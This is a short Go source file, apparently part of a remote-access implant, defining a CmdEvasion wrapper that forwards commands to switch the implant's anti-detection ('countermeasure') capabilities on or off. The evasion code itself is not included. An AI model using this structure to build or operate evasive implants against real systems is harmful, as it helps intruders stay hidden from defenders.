package services

import "implant/core/commands"

// CmdEvasion 对抗能力开关命令包装（P4）。
// cmdBuf: ""|status|reset|all on|off|on <能力>|off <能力>。
// 实现见 core/commands/evasion_cmd_*.go。
func CmdEvasion(cmdBuf []byte) ([]byte, error) {
	return commands.EvasionControl(cmdBuf)
}
